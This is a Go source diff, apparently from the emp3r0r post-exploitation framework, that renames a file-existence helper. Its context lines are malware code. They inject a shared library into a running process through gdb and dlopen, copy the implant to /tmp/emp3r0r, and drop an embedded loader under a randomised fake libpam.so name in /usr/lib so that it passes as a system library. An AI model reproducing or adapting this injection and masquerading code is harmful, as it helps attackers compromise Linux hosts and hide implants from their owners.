@@ -21,7 +21,7 @@ import (
 // inject a shared library using dlopen
 func gdbInjectSOWorker(path_to_so string, pid int) error {
 	gdb_path := RuntimeConfig.UtilsPath + "/gdb"
-	if !util.IsFileExist(gdb_path) {
+	if !util.IsExist(gdb_path) {
 		res := VaccineHandler()
 		if !strings.Contains(res, "success") {
 			return fmt.Errorf("Download gdb via VaccineHandler: %s", res)
@@ -29,7 +29,7 @@ func gdbInjectSOWorker(path_to_so string, pid int) error {
 	}
 
 	temp := "/tmp/emp3r0r"
-	if util.IsFileExist(temp) {
+	if util.IsExist(temp) {
 		os.RemoveAll(temp) // ioutil.WriteFile returns "permission denied" when target file exists, can you believe that???
 	}
 	err := CopySelfTo(temp)
@@ -82,7 +82,7 @@ func prepare_injectSO(pid int) (so_path string, err error) {
 		root_so_path := fmt.Sprintf("/usr/lib/x86_64-linux-gnu/libpam.so.1.%d.1", util.RandInt(0, 20))
 		so_path = root_so_path
 	}
-	if !util.IsFileExist(so_path) {
+	if !util.IsExist(so_path) {
 		out, err := golpe.ExtractFileFromString(file.LoaderSO_Data)
 		if err != nil {
 			return "", fmt.Errorf("Extract loader.so failed: %v", err)
